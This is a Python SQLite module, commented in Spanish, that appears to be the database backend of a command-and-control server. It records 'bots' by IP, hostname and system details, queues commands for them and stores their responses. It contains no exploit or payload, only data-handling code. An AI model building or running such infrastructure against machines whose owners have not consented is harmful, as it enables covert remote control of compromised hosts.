"""
Módulo de gestión de base de datos usando SQLite3.
"""

import sqlite3
import logging
import os
import json
from datetime import datetime
from typing import Dict, List, Optional, Union, Any
from pathlib import Path
import sys

# Añadir el directorio src al path para poder importar desde bbdd
sys.path.append(str(Path(__file__).parent.parent))
from bbdd.init_db import init_databases

class DatabaseManager:
    def __init__(self, db_path: Optional[str] = None):
        """
        Inicializa el gestor de base de datos.
        
        Args:
            db_path: Ruta opcional a la base de datos. Si no se proporciona,
                    se usará la ubicación predeterminada en src/bbdd/
        """
        if db_path:
            self.db_path = db_path
            self._ensure_db_directory()
        else:
            self.db_dir = Path(__file__).parent.parent / "bbdd"
            self.db_path = str(self.db_dir / "bots.db")
            os.makedirs(self.db_dir, exist_ok=True)

        self._init_database()

    def _ensure_db_directory(self):
        os.makedirs(os.path.dirname(self.db_path), exist_ok=True)

    def _init_database(self):
        """Inicializa o actualiza el esquema de la base de datos."""
        try:
            # Importar y llamar a la función de inicialización
            from bbdd.init_db import init_databases
            init_databases(self.db_path)
        except Exception as e:
            logging.error(f"Error inicializando base de datos: {e}")
            raise

    def register_bot(self, unique_id: str, ip_address: str, system_info: Dict = None, hostname: str = None, additional_info: Dict = None) -> int:
        """
        Registra o actualiza un bot en la base de datos.
        
        Args:
            unique_id: Identificador único del bot
            ip_address: Dirección IP del bot
            system_info: Información del sistema (SO, versión, etc)
            hostname: Nombre del host
            additional_info: Información adicional opcional
        
        Returns:
            ID del bot en la base de datos
        """
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                now = datetime.now().isoformat()

                # Si system_info es string, convertir a dict
                if isinstance(system_info, str):
                    system_info = {"os": system_info}
                
                # Combinar system_info y additional_info
                full_info = {**(system_info or {})}
                if additional_info:
                    full_info.update(additional_info)

                # Intentar actualizar primero
                cursor.execute('''
                UPDATE bots 
                SET ip_address = ?, system_info = ?, last_seen = ?, is_active = 1
                WHERE unique_id = ?
                ''', (ip_address, json.dumps(full_info), now, unique_id))

                # Si no existe, insertar
                if cursor.rowcount == 0:
                    cursor.execute('''
                    INSERT INTO bots (unique_id, ip_address, system_info, first_seen, last_seen)
                    VALUES (?, ?, ?, ?, ?)
                    ''', (unique_id, ip_address, json.dumps(full_info), now, now))

                conn.commit()
                return cursor.lastrowid
        except Exception as e:
            logging.error(f"Error registrando bot: {e}")
            raise

    def store_command(self, bot_id: int, command: str, response: str = None, success: bool = True):
        """Almacena un comando y su respuesta."""
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('''
                INSERT INTO commands (bot_id, command, response, success)
                VALUES (?, ?, ?, ?)
                ''', (bot_id, command, response, success))
                conn.commit()
                return cursor.lastrowid
        except Exception as e:
            logging.error(f"Error almacenando comando: {e}")
            raise

    def get_bot_history(self, bot_id: int, limit: int = 100) -> List[Dict]:
        """Obtiene el historial de comandos de un bot."""
        try:
            with sqlite3.connect(self.db_path) as conn:
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()
                cursor.execute('''
                SELECT * FROM commands 
                WHERE bot_id = ? 
                ORDER BY timestamp DESC 
                LIMIT ?
                ''', (bot_id, limit))
                return [dict(row) for row in cursor.fetchall()]
        except Exception as e:
            logging.error(f"Error obteniendo historial: {e}")
            return []

    def get_active_bots(self) -> List[Dict]:
        """Obtiene lista de bots activos."""
        try:
            with sqlite3.connect(self.db_path) as conn:
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()
                cursor.execute('''
                SELECT * FROM bots 
                WHERE is_active = 1
                ORDER BY last_seen DESC
                ''')
                return [dict(row) for row in cursor.fetchall()]
        except Exception as e:
            logging.error(f"Error obteniendo bots activos: {e}")
            return []

    def update_bot_status(self, bot_id: int, is_active: bool = True):
        """Actualiza el estado de un bot."""
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('''
                UPDATE bots 
                SET is_active = ?,
                    last_seen = CASE WHEN ? THEN CURRENT_TIMESTAMP ELSE last_seen END
                WHERE id = ?
                ''', (is_active, is_active, bot_id))
                conn.commit()
        except Exception as e:
            logging.error(f"Error actualizando estado del bot: {e}")
            raise

    def add_stats(self, bot_id: int, stat_type: str, value: Any):
        """Añade una estadística para un bot."""
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('''
                INSERT INTO stats (bot_id, type, value)
                VALUES (?, ?, ?)
                ''', (bot_id, stat_type, json.dumps(value)))
                conn.commit()
        except Exception as e:
            logging.error(f"Error añadiendo estadística: {e}")
            raise

    def get_pending_commands(self, bot_id: int) -> List[Dict[str, Any]]:
        """Obtiene los comandos pendientes para un bot."""
        try:
            with sqlite3.connect(self.db_path) as conn:
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()
                
                cursor.execute("""
                    SELECT id, command FROM commands
                    WHERE bot_id = ? AND executed = 0
                    ORDER BY timestamp ASC
                """, (bot_id,))
                
                return [dict(row) for row in cursor.fetchall()]
                
        except Exception as e:
            logging.error(f"Error obteniendo comandos pendientes: {e}")
            return []

    def store_response(self, bot_id: int, command: str, response: str) -> bool:
        """Almacena la respuesta de un comando."""
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                
                cursor.execute("""
                    INSERT INTO commands (bot_id, command, response, executed)
                    VALUES (?, ?, ?, 1)
                """, (bot_id, command, response))
                
                return True
                
        except Exception as e:
            logging.error(f"Error almacenando respuesta: {e}")
            return False

    def mark_command_executed(self, command_id: int) -> bool:
        """Marca un comando como ejecutado."""
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                
                cursor.execute("""
                    UPDATE commands
                    SET executed = 1
                    WHERE id = ?
                """, (command_id,))
                
                return True
                
        except Exception as e:
            logging.error(f"Error marcando comando como ejecutado: {e}")
            return False

    def mark_bot_inactive(self, bot_id: int) -> bool:
        """Marca un bot como inactivo."""
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                
                cursor.execute("""
                    UPDATE bots
                    SET is_active = 0
                    WHERE id = ?
                """, (bot_id,))
                
                return True
                
        except Exception as e:
            logging.error(f"Error marcando bot como inactivo: {e}")
            return False
